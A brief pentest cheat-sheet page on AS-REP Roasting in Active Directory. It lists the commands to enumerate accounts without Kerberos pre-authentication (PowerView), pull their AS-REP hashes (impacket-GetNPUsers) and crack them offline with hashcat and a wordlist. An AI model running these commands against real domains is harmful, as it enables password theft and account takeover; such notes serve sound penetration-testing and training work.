---
layout:
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# AS-REP Roasting

**AS-REP Roasting** targets Active Directory accounts without Kerberos pre-authentication.

The attack is made in few steps:

1. **Attacker requests TGT** from the KDC for a user without pre-authentication.
2. **KDC sends encrypted TGT** to the attacker.
3. **Attacker brute-forces** the TGT offline to obtain the user's password.

## Enumerate <a href="#enumerate" id="enumerate"></a>

Enumerating accounts with Kerberos pre-authentication disabled from inside the network.

{% tabs %}
{% tab title="PowerView" %}
```
Get-DomainUser -PreauthNotRequired -Verbose
```
{% endtab %}
{% endtabs %}

## Retrieve the hashes <a href="#crack" id="crack"></a>

```bash
impacket-GetNPUsers <domain_name>/ -no-pass -usersfile <userslist_file>
```

## Crack <a href="#crack" id="crack"></a>

```
hashcat -m 18200 <hashes> /usr/share/wordlists/rockyou.txt
```
